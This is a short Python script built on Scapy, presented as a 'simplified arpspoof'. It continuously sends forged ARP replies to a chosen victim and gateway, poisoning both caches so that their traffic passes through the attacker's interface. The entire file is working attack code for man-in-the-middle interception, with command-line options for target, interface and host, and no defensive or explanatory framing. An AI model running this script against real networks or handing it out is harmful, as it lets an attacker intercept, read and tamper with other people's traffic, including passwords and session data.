#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from scapy.layers.l2 import getmacbyip
import time
import argparse


def arpspoof(target='192.168.2.16', host='192.168.2.1', interface='eth2'):
    while True:
        pkt_target = Ether()/ARP(op='is-at', psrc=host, pdst=target,
                                 hwsrc=get_if_hwaddr(interface), hwdst=getmacbyip(target))
        pkt_host = Ether()/ARP(op='is-at', psrc=target, pdst=host,
                               hwsrc=get_if_hwaddr(interface), hwdst=getmacbyip(host))
        sendp(pkt_target)
        sendp(pkt_host)
        time.sleep(3)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='simplified arpspoof which is implemented by python')
    parser.add_argument('-t', type=str,  default='192.168.2.16',
                        metavar='target', help='target(victim) ip4 address')
    parser.add_argument('-i', type=str,  default='eth2',
                        metavar='interface', help='Specify the interface to use.')
    parser.add_argument('host', type=str, default='192.168.2.1',
                        metavar='host', help='Specify the host you wish to intercept packets for (usually the local gateway).')
    args = parser.parse_args()

    arpspoof(args.t, args.host, args.i)
